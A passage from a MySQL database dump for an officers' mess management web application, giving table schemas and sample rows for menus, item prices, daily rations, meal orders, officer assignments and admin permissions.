INSERT INTO `mess_daily_rations` VALUES (3, 1, 2, NULL, 100.00, 100, 'breakfast', '2023-02-01', '2', NULL, '1', '2023-01-31 10:19:05', '2023-01-31 10:19:05', NULL);

-- ----------------------------
-- Table structure for mess_menu_details
-- ----------------------------
DROP TABLE IF EXISTS `mess_menu_details`;
CREATE TABLE `mess_menu_details`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `menu_name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `menu_code` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `remarks` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `meal_type` int NULL DEFAULT NULL,
  `default_price` int NULL DEFAULT NULL,
  `status` int NOT NULL,
  `created_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `updated_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `version` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of mess_menu_details
-- ----------------------------
INSERT INTO `mess_menu_details` VALUES (1, 'Menu 1', 'menu-1-001', NULL, 1, NULL, 1, '2', NULL, '1', '2023-01-31 09:58:35', '2023-01-31 09:58:35', NULL);
INSERT INTO `mess_menu_details` VALUES (2, 'Menu 2', 'menu-2-002', NULL, 0, NULL, 1, '2', NULL, '1', '2023-01-31 09:58:50', '2023-01-31 09:58:50', NULL);

-- ----------------------------
-- Table structure for mess_menu_item_categories
-- ----------------------------
DROP TABLE IF EXISTS `mess_menu_item_categories`;
CREATE TABLE `mess_menu_item_categories`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `category_name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `updated_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `version` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 24 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of mess_menu_item_categories
-- ----------------------------
INSERT INTO `mess_menu_item_categories` VALUES (1, 'Messing', NULL, NULL, NULL, '2022-12-05 02:55:58', '2023-01-11 11:52:04', NULL);
INSERT INTO `mess_menu_item_categories` VALUES (2, 'Dessert', NULL, '2', NULL, '2022-12-07 02:55:58', '2023-01-13 11:34:25', NULL);
INSERT INTO `mess_menu_item_categories` VALUES (3, 'Extra-Messing', NULL, NULL, NULL, '2022-12-06 02:55:58', '2022-12-27 09:27:13', NULL);
INSERT INTO `mess_menu_item_categories` VALUES (4, 'Tea', NULL, NULL, NULL, '2022-12-08 02:55:58', '2022-12-27 09:32:48', NULL);

-- ----------------------------
-- Table structure for mess_menu_item_prices
-- ----------------------------
DROP TABLE IF EXISTS `mess_menu_item_prices`;
CREATE TABLE `mess_menu_item_prices`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `mess_id` int NOT NULL,
  `item_id` int NULL DEFAULT NULL,
  `scale` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `price` double(5, 2) NULL DEFAULT 0.00,
  `status` varchar(11) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT '',
  `date` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_by` int NOT NULL,
  `updated_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT '',
  `version` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT '',
  `created_at` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `updated_at` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `deleted_at` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 7 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of mess_menu_item_prices
-- ----------------------------
INSERT INTO `mess_menu_item_prices` VALUES (1, 1, 10, '1', 90.00, '1', '2023-01-31', 2, '', '1', '2023-01-31 10:01:18', '2023-01-31 10:01:18', NULL);
INSERT INTO `mess_menu_item_prices` VALUES (2, 1, 11, '1', 130.00, '1', '2023-01-31', 2, '', '1', '2023-01-31 10:01:25', '2023-01-31 10:01:25', NULL);
INSERT INTO `mess_menu_item_prices` VALUES (3, 1, 8, '1', 290.00, '1', '2023-01-31', 2, '', '1', '2023-01-31 10:01:35', '2023-01-31 10:01:35', NULL);
INSERT INTO `mess_menu_item_prices` VALUES (4, 1, 9, '1', 120.00, '1', '2023-01-31', 2, '', '1', '2023-01-31 10:01:41', '2023-01-31 10:01:41', NULL);
INSERT INTO `mess_menu_item_prices` VALUES (5, 1, 6, '1', 80.00, '1', '2023-01-31', 2, '', '1', '2023-01-31 10:01:48', '2023-01-31 10:01:48', NULL);
INSERT INTO `mess_menu_item_prices` VALUES (6, 1, 7, '1', 60.00, '1', '2023-01-31', 2, '', '1', '2023-01-31 10:01:54', '2023-01-31 10:01:54', NULL);

-- ----------------------------
-- Table structure for mess_menu_items
-- ----------------------------
DROP TABLE IF EXISTS `mess_menu_items`;
CREATE TABLE `mess_menu_items`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `category_id` int NOT NULL,
  `status` int NOT NULL,
  `item_name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `item_code` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT '',
  `mess_id` int NOT NULL,
  `created_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `updated_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `version` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT NULL ON UPDATE CURRENT_TIMESTAMP,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 12 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of mess_menu_items
-- ----------------------------
INSERT INTO `mess_menu_items` VALUES (1, 1, 1, 'Rice', 'messing-rice-001', 1, '2', NULL, '1', '2023-01-31 09:52:41', '2023-01-31 09:52:41', NULL);
INSERT INTO `mess_menu_items` VALUES (2, 1, 1, 'Dhal Curry', 'messing-dhal-curry-002', 1, '2', NULL, '1', '2023-01-31 09:52:47', '2023-01-31 09:52:47', NULL);
INSERT INTO `mess_menu_items` VALUES (3, 1, 1, 'Chicken Curry', 'messing-chicken-curry-003', 1, '2', NULL, '1', '2023-01-31 09:52:51', '2023-01-31 09:52:51', NULL);
INSERT INTO `mess_menu_items` VALUES (4, 1, 1, 'Potato Tempered', 'messing-potato-tempered-004', 1, '2', NULL, '1', '2023-01-31 09:52:56', '2023-01-31 09:52:56', NULL);
INSERT INTO `mess_menu_items` VALUES (5, 1, 1, 'Papadam', 'messing-papadam-005', 1, '2', NULL, '1', '2023-01-31 09:53:00', '2023-01-31 09:53:00', NULL);
INSERT INTO `mess_menu_items` VALUES (6, 2, 0, 'Ice Cream', 'dessert-ice-cream-006', 1, '2', '2', '1', '2023-01-31 04:33:39', '2023-01-31 10:03:39', NULL);
INSERT INTO `mess_menu_items` VALUES (7, 2, 1, 'Jelly', 'dessert-jelly-007', 1, '2', NULL, '1', '2023-01-31 09:53:17', '2023-01-31 09:53:17', NULL);
INSERT INTO `mess_menu_items` VALUES (8, 3, 1, 'Magee Noodles', 'extra-messing-magee-noodles-008', 1, '2', NULL, '1', '2023-01-31 09:53:27', '2023-01-31 09:53:27', NULL);
INSERT INTO `mess_menu_items` VALUES (9, 3, 1, 'Soussagus', 'extra-messing-soussagus-009', 1, '2', '2', '1', '2023-01-31 04:23:55', '2023-01-31 09:53:55', NULL);
INSERT INTO `mess_menu_items` VALUES (10, 4, 1, 'Milk Tea', 'tea-milk-tea-010', 1, '2', NULL, '1', '2023-01-31 09:53:40', '2023-01-31 09:53:40', NULL);
INSERT INTO `mess_menu_items` VALUES (11, 4, 1, 'Coffee', 'tea-coffee-011', 1, '2', NULL, '1', '2023-01-31 09:53:45', '2023-01-31 09:53:45', NULL);

-- ----------------------------
-- Table structure for mess_menus
-- ----------------------------
DROP TABLE IF EXISTS `mess_menus`;
CREATE TABLE `mess_menus`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `mess_id` int NOT NULL,
  `mess_menu_id` int NOT NULL,
  `item_id` int NOT NULL,
  `created_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `updated_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `version` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 8 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of mess_menus
-- ----------------------------
INSERT INTO `mess_menus` VALUES (1, 1, 1, 1, '2', NULL, '1', '2023-01-31 09:58:35', '2023-01-31 09:58:35', NULL);
INSERT INTO `mess_menus` VALUES (2, 1, 1, 3, '2', NULL, '1', '2023-01-31 09:58:35', '2023-01-31 09:58:35', NULL);
INSERT INTO `mess_menus` VALUES (3, 1, 1, 4, '2', NULL, '1', '2023-01-31 09:58:35', '2023-01-31 09:58:35', NULL);
INSERT INTO `mess_menus` VALUES (4, 1, 1, 5, '2', NULL, '1', '2023-01-31 09:58:35', '2023-01-31 09:58:35', NULL);
INSERT INTO `mess_menus` VALUES (5, 1, 2, 1, '2', NULL, '1', '2023-01-31 09:58:50', '2023-01-31 09:58:50', NULL);
INSERT INTO `mess_menus` VALUES (6, 1, 2, 2, '2', NULL, '1', '2023-01-31 09:58:50', '2023-01-31 09:58:50', NULL);
INSERT INTO `mess_menus` VALUES (7, 1, 2, 4, '2', NULL, '1', '2023-01-31 09:58:50', '2023-01-31 09:58:50', NULL);

-- ----------------------------
-- Table structure for mess_orders
-- ----------------------------
DROP TABLE IF EXISTS `mess_orders`;
CREATE TABLE `mess_orders`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `mess_id` int NOT NULL,
  `officer_id` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `order_breakfast` int NULL DEFAULT 0,
  `order_lunch` int NULL DEFAULT 0,
  `order_dinner` int NULL DEFAULT 0,
  `order_event` int NULL DEFAULT 0,
  `order_other` int NULL DEFAULT 0,
  `order_breakfast_status` int NULL DEFAULT NULL,
  `order_lunch_status` int NULL DEFAULT NULL,
  `order_dinner_status` int NULL DEFAULT NULL,
  `order_event_status` int NULL DEFAULT NULL,
  `order_other_status` int NULL DEFAULT NULL,
  `ordered_date` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `rtaion_date` date NULL DEFAULT NULL,
  `created_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `accepted_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `ip` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 5 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of mess_orders
-- ----------------------------
INSERT INTO `mess_orders` VALUES (1, 1, '100008618', 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, '2023-01-31', '2023-01-31', '2', NULL, '172.16.66.104', '2023-01-31 10:16:23', '2023-01-31 10:16:23', NULL);
INSERT INTO `mess_orders` VALUES (2, 1, '100380913', 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, '2023-01-31', '2023-01-31', '2', NULL, '172.16.66.104', '2023-01-31 10:17:07', '2023-01-31 10:17:43', NULL);
INSERT INTO `mess_orders` VALUES (3, 1, '100008618', 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, '2023-01-31', '2023-02-01', '2', NULL, '172.16.66.104', '2023-01-31 10:19:36', '2023-01-31 10:19:36', NULL);
INSERT INTO `mess_orders` VALUES (4, 1, '100380912', 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, '2023-01-31', '2023-01-31', '2', NULL, '172.16.66.104', '2023-01-31 10:31:00', '2023-01-31 10:31:00', NULL);

-- ----------------------------
-- Table structure for messes
-- ----------------------------
DROP TABLE IF EXISTS `messes`;
CREATE TABLE `messes`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `estb` int NOT NULL,
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `location` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `abbr` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `code` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `updated_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `version` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of messes
-- ----------------------------
INSERT INTO `messes` VALUES (1, 11, 'RHQ-SLSC Mess', 'Panagoda', 'SLSC', 'SLSC-001', '1', NULL, '1', '2023-01-31 09:24:48', '2023-01-31 09:24:48', NULL);

-- ----------------------------
-- Table structure for migrations
-- ----------------------------
DROP TABLE IF EXISTS `migrations`;
CREATE TABLE `migrations`  (
  `id` int UNSIGNED NOT NULL AUTO_INCREMENT,
  `migration` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int NOT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 104 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of migrations
-- ----------------------------
INSERT INTO `migrations` VALUES (1, '2014_10_12_000000_create_users_table', 1);
INSERT INTO `migrations` VALUES (2, '2014_10_12_100000_create_password_resets_table', 1);
INSERT INTO `migrations` VALUES (3, '2019_08_19_000000_create_failed_jobs_table', 1);
INSERT INTO `migrations` VALUES (4, '2019_12_14_000001_create_personal_access_tokens_table', 1);
INSERT INTO `migrations` VALUES (6, '2022_11_16_051430_create_admins_table', 2);
INSERT INTO `migrations` VALUES (10, '2022_11_18_072019_create_permission_tables', 4);
INSERT INTO `migrations` VALUES (12, '2022_11_21_055404_add_mess_to_admins_table', 5);
INSERT INTO `migrations` VALUES (57, '2022_12_01_035437_create_user_types_table', 12);
INSERT INTO `migrations` VALUES (61, '2022_12_01_040939_create_establishments_table', 13);
INSERT INTO `migrations` VALUES (62, '2022_12_01_082326_add_user_type_to_admins_table', 14);
INSERT INTO `migrations` VALUES (63, '2022_11_16_093409_create_messes_table', 15);
INSERT INTO `migrations` VALUES (65, '2022_11_21_085236_create_mess_menu_item_categories_table', 16);
INSERT INTO `migrations` VALUES (70, '2022_12_06_071412_create_item_prices_table', 19);
INSERT INTO `migrations` VALUES (71, '2022_12_08_092106_add_abbreviation_to_messes_table', 20);
INSERT INTO `migrations` VALUES (73, '2022_12_12_035133_add_mess_id_to_roles_table', 21);
INSERT INTO `migrations` VALUES (91, '2022_11_25_044427_create_mess_menus_table', 22);
INSERT INTO `migrations` VALUES (92, '2022_11_28_055918_create_mess_daily_rations_table', 22);
INSERT INTO `migrations` VALUES (93, '2022_12_12_101727_add_menu_type_to_mess_menu_table', 22);
INSERT INTO `migrations` VALUES (94, '2022_11_22_050354_create_mess_menu_items_table', 23);
INSERT INTO `migrations` VALUES (95, '2022_12_13_034018_add_item_code_to_mess_menu_items_table', 23);
INSERT INTO `migrations` VALUES (96, '2022_12_15_164839_add__meal_type_to_mess_menus_table', 23);
INSERT INTO `migrations` VALUES (97, '2022_12_25_171148_add_officer_details_to_users_table', 24);
INSERT INTO `migrations` VALUES (98, '2022_12_26_050430_create_orders_table', 25);
INSERT INTO `migrations` VALUES (99, '2022_12_26_082058_create_order_details_table', 25);
INSERT INTO `migrations` VALUES (100, '2022_12_26_111255_add_enumber_to_users_table', 25);
INSERT INTO `migrations` VALUES (102, '2023_01_09_161508_create_event_orders_table', 26);
INSERT INTO `migrations` VALUES (103, '2023_01_09_163132_create_event_order_details_table', 26);

-- ----------------------------
-- Table structure for model_has_permissions
-- ----------------------------
DROP TABLE IF EXISTS `model_has_permissions`;
CREATE TABLE `model_has_permissions`  (
  `permission_id` bigint UNSIGNED NOT NULL,
  `model_type` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `model_id` bigint UNSIGNED NOT NULL,
  PRIMARY KEY (`permission_id`, `model_id`, `model_type`) USING BTREE,
  INDEX `model_has_permissions_model_id_model_type_index`(`model_id` ASC, `model_type` ASC) USING BTREE,
  CONSTRAINT `model_has_permissions_permission_id_foreign` FOREIGN KEY (`permission_id`) REFERENCES `permissions` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of model_has_permissions
-- ----------------------------

-- ----------------------------
-- Table structure for model_has_roles
-- ----------------------------
DROP TABLE IF EXISTS `model_has_roles`;
CREATE TABLE `model_has_roles`  (
  `role_id` bigint UNSIGNED NOT NULL,
  `model_type` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `model_id` bigint UNSIGNED NOT NULL,
  PRIMARY KEY (`role_id`, `model_id`, `model_type`) USING BTREE,
  INDEX `model_has_roles_model_id_model_type_index`(`model_id` ASC, `model_type` ASC) USING BTREE,
  CONSTRAINT `model_has_roles_role_id_foreign` FOREIGN KEY (`role_id`) REFERENCES `roles` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of model_has_roles
-- ----------------------------
INSERT INTO `model_has_roles` VALUES (2, 'App\\Models\\Admin', 3);
INSERT INTO `model_has_roles` VALUES (1, 'App\\Models\\Admin', 4);
INSERT INTO `model_has_roles` VALUES (2, 'App\\Models\\Admin', 5);
INSERT INTO `model_has_roles` VALUES (3, 'App\\Models\\Admin', 6);
INSERT INTO `model_has_roles` VALUES (4, 'App\\Models\\Admin', 7);

-- ----------------------------
-- Table structure for notifications
-- ----------------------------
DROP TABLE IF EXISTS `notifications`;
CREATE TABLE `notifications`  (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `mess_order_id` int NOT NULL,
  `order_breakfast` int NULL DEFAULT NULL,
  `order_lunch` int NULL DEFAULT NULL,
  `order_dinner` int NULL DEFAULT NULL,
  `order_event` int NULL DEFAULT NULL,
  `order_other` int NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 5 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of notifications
-- ----------------------------
INSERT INTO `notifications` VALUES (1, 1, NULL, NULL, 1, NULL, NULL, '2023-01-31 10:16:23', '2023-01-31 10:19:47');
INSERT INTO `notifications` VALUES (2, 2, NULL, 1, 1, NULL, NULL, '2023-01-31 10:17:07', '2023-01-31 10:19:47');
INSERT INTO `notifications` VALUES (3, 3, 1, NULL, NULL, NULL, NULL, '2023-01-31 10:19:36', '2023-01-31 10:19:45');
INSERT INTO `notifications` VALUES (4, 4, NULL, NULL, 1, NULL, NULL, '2023-01-31 10:31:00', '2023-01-31 10:31:27');

-- ----------------------------
-- Table structure for officers_assigns
-- ----------------------------
DROP TABLE IF EXISTS `officers_assigns`;
CREATE TABLE `officers_assigns`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `enum` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `mess_id` int NOT NULL,
  `status` int NOT NULL,
  `assigned_date` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `assigned_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `deactivated_date` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `deactivated_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 5 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of officers_assigns
-- ----------------------------
INSERT INTO `officers_assigns` VALUES (1, '100380912', 1, 1, '2023-01-31', '2', NULL, NULL, '2023-01-31 09:30:26', '2023-01-31 09:30:26');
INSERT INTO `officers_assigns` VALUES (2, '100380913', 1, 1, '2023-01-31', '2', NULL, NULL, '2023-01-31 09:30:41', '2023-01-31 09:30:41');
INSERT INTO `officers_assigns` VALUES (3, '100380844', 1, 1, '2023-01-31', '2', NULL, NULL, '2023-01-31 09:31:03', '2023-01-31 09:31:03');
INSERT INTO `officers_assigns` VALUES (4, '100008618', 1, 1, '2023-01-31', '2', NULL, NULL, '2023-01-31 09:51:43', '2023-01-31 09:51:43');

-- ----------------------------
-- Table structure for password_resets
-- ----------------------------
DROP TABLE IF EXISTS `password_resets`;
CREATE TABLE `password_resets`  (
  `email` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  INDEX `password_resets_email_index`(`email` ASC) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of password_resets
-- ----------------------------

-- ----------------------------
-- Table structure for permissions
-- ----------------------------
DROP TABLE IF EXISTS `permissions`;
CREATE TABLE `permissions`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `guard_name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `permissions_name_guard_name_unique`(`name` ASC, `guard_name` ASC) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 27 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of permissions
-- ----------------------------
INSERT INTO `permissions` VALUES (1, 'manage-users', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (2, 'manage-roles', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (3, 'view-mess-item-categories', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (4, 'manage-sub-menu-items', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (5, 'manage-mess-menus', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (6, 'add-daily-rations', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (7, 'add-tea-items', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (8, 'add-extra-messing', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (9, 'add-desserts', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (10, 'place-orders', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (11, 'view-orders', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (12, 'register-officers', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (13, 'stock-view', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (14, 'grn-list', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (15, 'issue-list', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (16, 'item-list', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (17, 'stock-list', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (18, 'reports-list', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (19, 'stock-book', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (20, 'category-list', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (21, 'measureUnit-list', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (22, 'supplier-list', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (23, 'bar-orders', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (24, 'billing', 'admin', '2022-11-03 10:01:25', NULL);
INSERT INTO `permissions` VALUES (25, 'bar-stock', 'admin', '2023-01-16 20:31:29', NULL);
INSERT INTO `permissions` VALUES (26, 'view-orders-report', 'admin', '2023-01-17 09:49:33', NULL);

-- ----------------------------
-- Table structure for personal_access_tokens
-- ----------------------------
DROP TABLE IF EXISTS `personal_access_tokens`;
CREATE TABLE `personal_access_tokens`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `tokenable_type` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `tokenable_id` bigint UNSIGNED NOT NULL,
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `abilities` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL,
  `last_used_at` timestamp NULL DEFAULT NULL,
  `expires_at` timestamp NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `personal_access_tokens_token_unique`(`token` ASC) USING BTREE,
